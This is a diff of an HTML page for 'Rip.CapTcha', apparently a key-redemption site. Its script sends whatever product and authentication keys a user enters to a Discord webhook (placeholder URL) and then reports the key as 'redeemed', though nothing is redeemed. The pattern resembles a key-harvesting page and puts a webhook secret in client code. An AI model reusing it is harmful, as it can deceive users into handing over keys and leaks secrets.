@@ -1,113 +1,170 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Rip.CapTcha - Key Redemption</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Rip.CapTcha - Discord Webhook Redeemer</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* Custom scrollbar for dark theme */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #0f172a;
+    }
+    ::-webkit-scrollbar-thumb {
+      background-color: #3b82f6;
+      border-radius: 10px;
+    }
+  </style>
 </head>
-<body class="bg-gray-900 text-white font-sans">
+<body class="bg-[#0f172a] min-h-screen flex flex-col">
 
   <!-- Navbar -->
-  <div class="flex justify-between items-center bg-gray-800 px-6 py-4 border-b border-gray-700">
-    <h1 class="flex items-center text-blue-400 font-bold text-lg">
-      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/>
+  <nav class="w-full flex items-center justify-between bg-[#121d38] px-6 py-4 shadow-md select-none">
+    <div class="flex items-center space-x-2 text-[#3b82f6] font-semibold text-lg cursor-pointer select-text">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="#3b82f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="12" y1="5" x2="12" y2="19" />
+        <line x1="5" y1="12" x2="19" y2="12" />
       </svg>
-      Rip.CapTcha
-    </h1>
-    <a href="#" class="text-white hover:text-blue-400 flex items-center">
-      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" viewBox="0 0 20 20" fill="currentColor">
-        <path fill-rule="evenodd" d="M10 2a6 6 0 016 6v2h2a2 2 0 012 2v6a2 2 0 01-2 2h-6a6 6 0 01-12 0H2a2 2 0 01-2-2v-6a2 2 0 012-2h2V8a6 6 0 016-6z" clip-rule="evenodd" />
-      </svg>
-      Login
-    </a>
-  </div>
-
-  <!-- Main Card -->
-  <div class="flex justify-center mt-12">
-    <div class="bg-gray-800 p-10 rounded-2xl shadow-lg w-full max-w-xl text-center">
-      <svg class="mx-auto w-12 h-12 text-blue-400 mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 .552-.224 1.05-.586 1.414A1.994 1.994 0 0110 13c-.552 0-1.05-.224-1.414-.586A1.994 1.994 0 018 11c0-.552.224-1.05.586-1.414A1.994 1.994 0 0110 9c.552 0 1.05.224 1.414.586.362.364.586.862.586 1.414z" />
-        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 11V5a4 4 0 014-4h4a4 4 0 014 4v6" />
-      </svg>
-      <h2 class="text-3xl font-bold text-blue-400">Rip.CapTcha</h2>
-      <p class="text-gray-400 mt-2">Advanced Key Management Platform</p>
-      <div class="flex justify-center space-x-6 mt-4">
-        <a href="https://ripcaptcha.net/store" class="text-gray-400 hover:text-blue-400">ripcaptcha.net/store</a>
-        <a href="https://discord.gg/ripcaptcha" class="text-gray-400 hover:text-blue-400">discord.gg/ripcaptcha</a>
-      </div>
+      <span>Rip.CapTcha</span>
     </div>
-  </div>
-
-  <!-- Redeem Form -->
-  <div class="flex justify-center mt-10">
-    <div class="bg-gray-800 p-8 rounded-2xl shadow-lg w-full max-w-2xl">
-      <h3 class="text-2xl font-bold text-blue-400 mb-6 flex items-center">
-        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 .552-.224 1.05-.586 1.414A1.994 1.994 0 0110 13c-.552 0-1.05-.224-1.414-.586A1.994 1.994 0 018 11c0-.552.224-1.05.586-1.414A1.994 1.994 0 0110 9c.552 0 1.05.224 1.414.586.362.364.586.862.586 1.414z" />
+    <div>
+      <button id="loginBtn" class="flex items-center text-white hover:text-[#3b82f6] transition select-none">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-1" fill="none" viewBox="0 0 24 24" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M16 21v-2a4 4 0 00-3-3.87" />
+          <path d="M12 7a4 4 0 100-8 4 4 0 000 8z" />
+          <path d="M4 19a9 9 0 0116 0" />
         </svg>
-        Redeem Your Key
-      </h3>
-      <form id="redeemForm" class="space-y-4">
-        <input type="text" id="productKey" placeholder="ENTER YOUR PRODUCT KEY"
-          class="w-full p-3 rounded-lg bg-gray-700 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500">
-
-        <input type="text" id="authKey" placeholder="ENTER YOUR AUTHENTICATION KEY"
-          class="w-full p-3 rounded-lg bg-gray-700 text-white border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500">
-
-        <button type="submit"
-          class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-6 rounded-lg transition">
-          Submit
-        </button>
-      </form>
-      <p id="responseMsg" class="text-center mt-4 text-gray-400"></p>
+        Login
+      </button>
     </div>
-  </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="flex-grow flex flex-col items-center justify-center px-4 py-12 space-y-10">
+
+    <!-- Card 1: Branding and info -->
+    <section class="max-w-xl w-full rounded-lg bg-[#1e293b] p-7 text-center shadow-lg">
+      <div class="flex flex-col items-center space-y-2 select-text">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-[#3b82f6]" fill="none" viewBox="0 0 24 24" stroke="#3b82f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M15 10l4.553-2.276A2 2 0 0020 6.382V4a2 2 0 00-2-2h-6a2 2 0 00-2 2v3" />
+          <path d="M9 13v4a2 2 0 002 2h4a2 2 0 002-2v-4" />
+          <circle cx="12" cy="12" r="10" stroke="#3b82f6" stroke-width="2" />
+        </svg>
+        <h1 class="text-2xl font-bold text-[#3b82f6]">Rip.CapTcha</h1>
+        <p class="text-gray-300 text-sm font-light">Advanced Key Management Platform</p>
+        <div class="flex justify-center space-x-8 mt-3 text-gray-400 text-xs font-light select-text">
+          <a href="https://ripcaptcha.net/store" class="hover:text-[#3b82f6] transition" target="_blank" rel="noopener noreferrer">ripcaptcha.net/store</a>
+          <a href="https://discord.gg/ripcaptcha" class="hover:text-[#3b82f6] transition" target="_blank" rel="noopener noreferrer">discord.gg/ripcaptcha</a>
+        </div>
+      </div>
+    </section>
+
+    <!-- Card 2: Redeem Key Form -->
+    <section class="max-w-xl w-full rounded-lg bg-[#1e293b] p-7 shadow-lg">
+      <form id="redeemForm" class="flex flex-col space-y-4">
+        <div class="flex items-center space-x-2 mb-2">
+          <span class="text-[#3b82f6] font-bold text-lg select-text">Redeem Your Key</span>
+          <div class="text-[#3b82f6] text-2xl font-bold select-text">°</div>
+        </div>
+        <input 
+          id="productKey" 
+          type="text" 
+          placeholder="ENTER YOUR PRODUCT KEY" 
+          required 
+          autocomplete="off"
+          class="bg-[#334155] placeholder-gray-400 text-white rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-[#3b82f6] transition"
+        />
+        <input 
+          id="authKey" 
+          type="text" 
+          placeholder="ENTER YOUR AUTHENTICATION KEY" 
+          required 
+          autocomplete="off"
+          class="bg-[#334155] placeholder-gray-400 text-white rounded-md p-3 focus:outline-none focus:ring-2 focus:ring-[#3b82f6] transition"
+        />
+        <button 
+          type="submit" 
+          class="bg-[#3b82f6] text-white font-semibold rounded-md py-3 hover:bg-[#2563eb] transition"
+        >Submit</button>
+      </form>
+      <p id="statusMsg" class="mt-3 text-center text-sm text-red-500 font-medium select-none"></p>
+    </section>
+
+  </main>
 
   <script>
-    document.getElementById("redeemForm").addEventListener("submit", async function(e) {
+    // Discord webhook URL: you need to replace this with your actual webhook url
+    const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+    // Reference status message paragraph
+    const statusMsg = document.getElementById("statusMsg");
+
+    // Redeem form submission handler
+    document.getElementById("redeemForm").addEventListener("submit", async (e) => {
       e.preventDefault();
-      
-      const webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
-      const productKey = document.getElementById("productKey").value;
-      const authKey = document.getElementById("authKey").value;
+      statusMsg.textContent = "";
+      const productKey = document.getElementById("productKey").value.trim();
+      const authKey = document.getElementById("authKey").value.trim();
 
       if (!productKey || !authKey) {
-        document.getElementById("responseMsg").innerText = "⚠️ Please fill out all fields.";
+        statusMsg.textContent = "Please fill out both keys.";
         return;
       }
 
-      const payload = {
-        embeds: [{
-          title: "🔑 New Key Redemption",
-          color: 3447003, // Blue
-          fields: [
-            { name: "Product Key", value: productKey, inline: false },
-            { name: "Authentication Key", value: authKey, inline: false }
-          ],
-          footer: { text: "Rip.CapTcha Security System" },
-          timestamp: new Date()
-        }]
+      // Prepare the content to send to Discord webhook
+      const content = {
+        username: "Rip.CapTcha Redeemer",
+        embeds: [
+          {
+            title: "Key Redeemed",
+            color: 3447003,
+            fields: [
+              { name: "Product Key", value: productKey, inline: true },
+              { name: "Authentication Key", value: authKey, inline: true }
+            ],
+            footer: {
+              text: "Rip.CapTcha - Advanced Key Management Platform"
+            },
+            timestamp: new Date().toISOString()
+          }
+        ],
       };
 
       try {
-        const response = await fetch(webhookURL, {
+        // Send data to webhook using fetch
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(content)
         });
 
         if (response.ok) {
-          document.getElementById("responseMsg").innerText = "✅ Submitted successfully!";
+          statusMsg.classList.remove("text-red-500");
+          statusMsg.classList.add("text-green-400");
+          statusMsg.textContent = "Key redeemed successfully!";
+          e.target.reset();
         } else {
-          document.getElementById("responseMsg").innerText = "❌ Error submitting data.";
+          throw new Error("Webhook request failed");
         }
       } catch (error) {
-        document.getElementById("responseMsg").innerText = "⚠️ Network error.";
+        statusMsg.classList.remove("text-green-400");
+        statusMsg.classList.add("text-red-500");
+        statusMsg.textContent = "Failed to submit keys. Try again later.";
+        console.error(error);
       }
+    });
+
+    // Login button (just a placeholder)
+    document.getElementById("loginBtn").addEventListener("click", () => {
+      alert("Login function is not implemented yet.");
     });
   </script>
 
 </body>
 </html>
+
